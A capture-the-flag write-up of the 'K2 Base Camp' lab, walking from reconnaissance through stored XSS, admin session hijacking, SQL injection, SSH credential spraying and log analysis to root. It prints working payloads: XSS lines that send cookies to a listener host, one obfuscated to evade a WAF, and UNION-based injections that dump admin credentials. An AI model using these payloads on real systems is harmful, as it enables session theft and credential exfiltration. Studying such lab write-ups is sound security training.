# K2 Base Camp — Penetration Test Write-Up

## 1. Reconnaissance

### 1.1 Network Scan

I started with a network scan against the target to enumerate open ports and running services. This gave me a baseline picture of the attack surface before moving into web enumeration.

<img width="624" height="259" alt="image" src="https://github.com/user-attachments/assets/1f7265fb-ac9b-47d6-a9a0-26c8cddb5b9c" />


### 1.2 Web Enumeration

I enumerated port 80 to get a feel for the web application's structure and identify what functionality was exposed.

<img width="624" height="229" alt="image" src="https://github.com/user-attachments/assets/8687397c-774a-4042-a977-3388bfc5dfde" />


I then checked for subdomains, which surfaced authentication portals I hadn't seen from the root domain alone; this told me there was an admin-facing interface separate from the main site.

<img width="487" height="507" alt="image" src="https://github.com/user-attachments/assets/08745ef0-5b16-47f0-9485-81aee71a1695" />


## 2. Initial Access — Stored Cross-Site Scripting (XSS)

While testing the ticket submission form, I noticed a message indicating submitted tickets would be reviewed shortly. I assumed this meant an administrator would be the one reviewing them, which made the ticket form a good candidate for a stored XSS attack targeting an admin session rather than my own.

I started with a straightforward payload to test for reflected/stored execution and cookie exfiltration:

```html
<script>fetch('http://192.168.160.5:8081/?c='+document.cookie)</script>
```

I submitted this in both the title and description fields. The title field showed no reaction at all, but injecting it into the description field triggered a Web Application Firewall (WAF) response. That told me the description field was likely processing my input in a way that made it exploitable, provided I could get past the filter.

<img width="446" height="266" alt="image" src="https://github.com/user-attachments/assets/f247e054-b351-4a12-9655-c1794e14dde0" />


I landed on the following payload as my next attempt, using an `onerror` event handler instead of a `<script>` tag and breaking up the `document.cookie` reference with string concatenation to try to dodge filtering:

```html
<img src=x onerror="fetch('http://192.168.160.5:8081/?c='+window['doc'+'ument']['coo'+'kie'])">
```

To pin down exactly what the WAF was keying on, I tested individual strings from my payload in isolation. That process showed the literal string `document.cookie` was what triggered detection — so splitting it into concatenated substrings (`'doc'+'ument'`, `'coo'+'kie'`) and rebuilding it at runtime via `window[...]` was enough to slip past the filter.

This payload worked, and I got valid session cookies back from my listener.

<img width="624" height="71" alt="image" src="https://github.com/user-attachments/assets/a4832059-a2c5-49df-952d-101b9c3a7362" />


## 3. Session Hijacking (Admin Account)

I decoded the JWT from the captured session and confirmed it belonged to an administrative user — meaning my XSS payload had successfully caught an admin's active session rather than a regular user's.

<img width="975" height="334" alt="image" src="https://github.com/user-attachments/assets/f96de731-7774-4682-8cc3-b5a71e6731fb" />


With an admin cookie in hand, I wanted to actually use that session rather than just confirm it existed. I ran `ffuf` against `admin.k2.thm` to enumerate directories on the admin subdomain, since I hadn't manually browsed it yet. That turned up a `/dashboard` path, which I assumed was where tickets would be viewed and managed from the admin side.

<img width="624" height="66" alt="image" src="https://github.com/user-attachments/assets/b30d0992-4911-4b5e-b907-6e33a22eefdd" />


I then used Burp Suite to replay the stolen session cookie against `/dashboard`, and it worked — I was in as the admin.

<img width="975" height="531" alt="image" src="https://github.com/user-attachments/assets/dcd767eb-81c6-4f1d-94a2-eff59bb4ab53" />


## 4. SQL Injection — Admin Dashboard

From inside the dashboard, I could select individual ticket tiles and search by keyword. That search functionality, combined with what I could infer about the underlying table structure (user, title, and description fields all being displayed together), pointed toward a SQL database backend — and potentially a SQL injection vulnerability in the search parameter.

I started with some basic injection tests directly in Burp.

<img width="624" height="268" alt="image" src="https://github.com/user-attachments/assets/6a01df56-b962-4bf8-968c-28f35eee7f88" />


Submitting a single quotation mark returned a 500 Internal Server Error. That's a classic sign the input was being concatenated straight into a SQL query without sanitization, which is what pushed me toward building out a UNION-based injection.

### 4.1 Database Fingerprinting

I began enumeration by identifying the database engine and version, since that shapes which syntax and functions I could use going forward:

```sql
title=nonexistent' UNION SELECT @@version,NULL,NULL-- -
```
<img width="624" height="316" alt="image" src="https://github.com/user-attachments/assets/4a20fd79-a58c-4df8-afee-f364c9776e1f" />


### 4.2 Database and Table Enumeration

Based on the engine confirmation, I crafted the next payload to identify the active database name:

```sql
title=nonexistent' UNION SELECT database(),NULL,NULL-- -
```

<img width="563" height="490" alt="image" src="https://github.com/user-attachments/assets/1a8200cf-b126-4e08-a306-87936b4b608c" />


This confirmed I was working inside the `ticketsite` database. I also noted that the `user` column was my reflection point in the response — i.e., the field position where my injected output would actually render back to me, which mattered for structuring later payloads.

I used the following to pull the table list:

```sql
title=nonexistent' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -
```

<img width="484" height="430" alt="image" src="https://github.com/user-attachments/assets/8e3321b5-13bd-4c55-8ed1-0084a98a860b" />


### 4.3 Extracting Admin Credentials

An `admin_auth` table stood out from the table list, so I checked its column structure first to know exactly what I could extract:

```sql
title=nonexistent' UNION SELECT GROUP_CONCAT(column_name),NULL,NULL FROM information_schema.columns WHERE table_name='admin_auth'-- -
```

<img width="624" height="434" alt="image" src="https://github.com/user-attachments/assets/8f196845-dabc-4a3e-9c50-5ad2e69b93fd" />


My first attempt tried to pull both username and password in a single request by concatenating them together:

```sql
title=nonexistent' UNION SELECT GROUP_CONCAT(admin_username,0x3a,admin_password SEPARATOR 0x0a),NULL,NULL FROM admin_auth-- -
```

This got flagged by the WAF, so I had to reevaluate the payload rather than push harder on the same structure.

<img width="479" height="467" alt="image" src="https://github.com/user-attachments/assets/a6978089-bb5d-4eb5-be12-c09248deb8cc" />


I simplified by pulling just the username column on its own:

```sql
title=nonexistent' UNION SELECT admin_username,NULL,NULL FROM admin_auth-- -
```

This got through cleanly and returned the admin usernames.

<img width="515" height="395" alt="image" src="https://github.com/user-attachments/assets/1d5fc53e-f81e-4757-8614-e56d415bb3ad" />


I followed the same approach for the passwords, placing them in the second output column instead of stacking everything into one field:

```sql
title=nonexistent' UNION SELECT admin_username,admin_password,NULL FROM admin_auth-- -
```

This returned the passwords tied to each username without tripping the WAF again.

<img width="481" height="361" alt="image" src="https://github.com/user-attachments/assets/bb2a14bd-2459-4bac-a933-11dcbb225cfb" />

## 5. Credential Access — SSH via Hydra

These credentials could only really go a couple of places, and since my earlier network scan only showed ports 80 and 22 open, SSH was the obvious next target. Rather than testing each credential pair manually, I put them into a text file and ran them against SSH in bulk with Hydra.

<img width="624" height="132" alt="image" src="https://github.com/user-attachments/assets/5eaec30f-846d-4ee3-80e9-b9e11f37bc07" />


That turned up a working password for the user `james`.

<img width="190" height="98" alt="image" src="https://github.com/user-attachments/assets/0a780171-c22a-462c-ba8e-85b6221ebf92" />


## 6. Foothold — User Flag

Once I was in as `james`, I grabbed the user flag before shifting focus to privilege escalation.

<img width="624" height="276" alt="image" src="https://github.com/user-attachments/assets/2c176810-7a3e-4373-baa3-a49c2f5ad2a8" />


## 7. Privilege Enumeration

I ran `id` to check my current user's group memberships and permissions.

<img width="487" height="57" alt="image" src="https://github.com/user-attachments/assets/05e31f0b-3d87-409a-8c3d-ffeb53f0b60b" />


I noticed membership in group `4 (adm)`. After a bit of research, I confirmed this group grants read access to system logs under `/var/log`, so I went and checked that directory out. It didn't turn up much on its own.

To make sure I wasn't missing anything, I ran `linpeas` in the background to automate the rest of the enumeration.

<img width="624" height="403" alt="image" src="https://github.com/user-attachments/assets/10676b61-b936-40a4-8438-db27a685f4b7" />


That surfaced that `james` owned the Flask application source code outright. Since I had full read access to the source, I checked the `admin_site` and `ticket_site` application directories for hardcoded credentials.

<img width="391" height="122" alt="image" src="https://github.com/user-attachments/assets/829f7904-4ad8-41f6-b925-8540c3179fd7" />

## 8. Lateral Movement — MySQL and Log Analysis

Finding hardcoded credentials in the source raised the question of password reuse. Before going further, I did a quick sanity check with `sudo -l` to see if those credentials granted any elevated privileges directly.

<img width="295" height="101" alt="image" src="https://github.com/user-attachments/assets/53d59b35-d491-4b49-a9a7-dd30a75197bc" />

That didn't work, but it was worth ruling out. I then used the same credentials to log into the MySQL database. Checking privileges there showed I had `ALL` — essentially the same level of access I already had as `james`, just reached through a different connection path rather than a new privilege boundary.

<img width="603" height="185" alt="image" src="https://github.com/user-attachments/assets/c371a1f3-7645-4359-bf7c-819cf19d99c6" />


I circled back to the read access on `/var/log` that came from the `adm` group membership. Since I'd already confirmed `james` couldn't reach root directly, I turned my attention to the other user I'd noticed on the box, `rose`. I ran a `grep` search across the full set of authentication logs to look for any login activity tied to that account.

<img width="624" height="64" alt="image" src="https://github.com/user-attachments/assets/7dd03ee3-9a37-44d3-b382-3e726183dc85" />

That search showed the last two login attempts for `rose` were successful, which meant I needed to dig into those specific log entries to find a password.

<img width="975" height="283" alt="image" src="https://github.com/user-attachments/assets/754359e5-c52b-43c7-bea0-c252e40009a5" />


The relevant log files were compressed as `.gz` archives, so they weren't readable as-is in my initial search.

<img width="624" height="324" alt="image" src="https://github.com/user-attachments/assets/8b81c5c4-30a7-4d2c-81fd-1d904d88570d" />


After decompressing them and re-running my search against the decompressed content, I landed on some useful information.

<img width="624" height="64" alt="image" src="https://github.com/user-attachments/assets/8d308263-9f5d-4352-946f-668fdcdfec12" />


That pass still didn't give me anything conclusive, so I reran a word search with `grep` against the wider log path to broaden my coverage.

<img width="624" height="64" alt="image" src="https://github.com/user-attachments/assets/20ed32fa-d8f1-4087-aa8f-e532d701569d" />


That search finally surfaced plaintext credentials for `rose`.

## 9. Privilege Escalation — Root

With `rose`'s credentials in hand, I was able to escalate privileges and get access to root.

<img width="193" height="58" alt="image" src="https://github.com/user-attachments/assets/330f9e25-e3de-4fe6-9e1d-124ddfd54cf5" />


From there I used `find` to locate the root flag and `cat`'d it out, wrapping up the engagement.

<img width="396" height="89" alt="image" src="https://github.com/user-attachments/assets/37cae6a5-d4b0-4777-a7d6-562840cfaf11" />
